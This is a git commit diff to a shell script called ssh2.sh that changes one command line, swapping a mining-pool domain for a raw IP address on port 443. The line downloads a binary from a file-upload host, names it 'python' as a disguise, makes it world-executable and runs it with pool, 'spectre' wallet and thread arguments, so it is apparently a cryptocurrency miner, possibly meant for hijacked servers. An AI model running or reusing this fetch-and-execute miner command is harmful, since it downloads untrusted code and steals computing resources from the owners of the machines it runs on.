7cd8b7d827a5ca12ad9f8047115b98eb3e570054
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-12-24 02:50:09 +0700

    Update ssh2.sh

--- ssh2.sh
+++ ssh2.sh
@@ -1,1 +1,1 @@
-wget https://upload.vina-host.com/ORTX6eFQop/python && chmod 777 python &&  ./python -d spectre.cedric-crispin.com:4364 -w spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.tes -t 4
+wget https://upload.vina-host.com/ORTX6eFQop/python && chmod 777 python &&  ./python -d 205.198.72.145:443 -w spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.tes -t 4
